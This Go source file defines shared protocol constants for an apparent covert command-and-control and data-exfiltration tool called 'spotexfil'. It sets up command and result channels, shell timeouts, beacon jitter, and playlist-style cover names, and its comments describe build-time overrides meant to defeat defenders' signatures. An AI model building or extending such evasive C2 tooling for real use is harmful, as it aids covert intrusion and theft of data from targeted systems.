// Package shared embeds and parses the shared protocol.json spec,
// exporting all constants for cross-language consistency.
package shared

import (
	_ "embed"
	"encoding/json"
	"fmt"
	"strings"
)

//go:embed protocol.json
var protocolJSON []byte

// Protocol represents the full protocol.json structure.
type Protocol struct {
	Version     int               `json:"version"`
	Crypto      CryptoSpec        `json:"crypto"`
	Compression CompressionSpec   `json:"compression"`
	Transport   TransportSpec     `json:"transport"`
	C2          C2Spec            `json:"c2"`
	WireFormat  map[string]string `json:"wire_format"`
}

// CryptoSpec defines cryptographic constants.
type CryptoSpec struct {
	KeySize       int    `json:"key_size"`
	NonceSize     int    `json:"nonce_size"`
	SaltSize      int    `json:"salt_size"`
	KDFIterations int    `json:"kdf_iterations"`
	KDFAlgorithm  string `json:"kdf_algorithm"`
	Cipher        string `json:"cipher"`
	Blake2bDigest int    `json:"blake2b_digest_size"`
	Blake2bHexLen int    `json:"blake2b_hex_len"`
}

// CompressionSpec defines compression constants.
type CompressionSpec struct {
	FlagCompressed int    `json:"flag_compressed"`
	FlagRaw        int    `json:"flag_raw"`
	Algorithm      string `json:"algorithm"`
	Level          int    `json:"level"`
}

// TransportSpec defines transport constants.
type TransportSpec struct {
	ChunkSize      int      `json:"chunk_size"`
	MaxPayloadSize int      `json:"max_payload_size"`
	MarkerSep      string   `json:"marker_sep"`
	CoverNames     []string `json:"cover_names"`
	FillerArtists  []string `json:"filler_artists"`
}

// C2Spec defines C2 protocol constants.
type C2Spec struct {
	TagLen           int    `json:"tag_len"`
	EffectiveChunk   int    `json:"effective_chunk"`
	ChannelCmd       string `json:"channel_cmd"`
	ChannelRes       string `json:"channel_res"`
	TagLabel         string `json:"tag_label"`
	MetaKeyLabel     string `json:"meta_key_label"`
	ShellTimeout     int    `json:"shell_timeout"`
	MaxResultSize    int    `json:"max_result_size"`
	DefaultInterval  int    `json:"default_interval"`
	DefaultJitter    int    `json:"default_jitter"`
	WaitTimeout      int    `json:"wait_timeout"`
	WaitPollInterval int    `json:"wait_poll_interval"`
}

// Proto is the parsed protocol spec, available at init time.
var Proto Protocol

// Build-time IOC overrides, injectable via -ldflags -X (see the Makefile
// 'obfuscated' target). Empty = use protocol.json defaults. These exist so
// each obfuscated build can ship unique cover names and crypto labels —
// static values shared across builds are signature material for defenders.
var (
	OverrideCoverNamesCSV    = "" // comma-separated cover playlist names
	OverrideFillerArtistsCSV = "" // comma-separated filler artists
	OverrideMetaKeyLabel     = "" // HMAC label for the chunk metadata key
	OverrideHKDFLabel        = "" // HKDF info label for session keys
	OverrideSessionStore     = "" // HMAC label for the session-store key
)

func init() {
	if err := json.Unmarshal(protocolJSON, &Proto); err != nil {
		panic(fmt.Sprintf("failed to parse protocol.json: %v", err))
	}
	applyOverrides()
}

// applyOverrides mutates Proto with any build-time injected values.
// Called from init; also called directly by tests.
func applyOverrides() {
	if OverrideCoverNamesCSV != "" {
		Proto.Transport.CoverNames = splitCSV(OverrideCoverNamesCSV)
	}
	if OverrideFillerArtistsCSV != "" {
		Proto.Transport.FillerArtists = splitCSV(OverrideFillerArtistsCSV)
	}
	if OverrideMetaKeyLabel != "" {
		Proto.C2.MetaKeyLabel = OverrideMetaKeyLabel
	}
}

func splitCSV(s string) []string {
	var out []string
	for _, part := range strings.Split(s, ",") {
		if part = strings.TrimSpace(part); part != "" {
			out = append(out, part)
		}
	}
	return out
}

// HKDFLabel returns the HKDF info label for session key derivation.
func HKDFLabel() string {
	if OverrideHKDFLabel != "" {
		return OverrideHKDFLabel
	}
	return "spotexfil-session-v1"
}

// SessionStoreLabel returns the HMAC label for the operator's session-store key.
func SessionStoreLabel() string {
	if OverrideSessionStore != "" {
		return OverrideSessionStore
	}
	return "spotexfil-session-store"
}
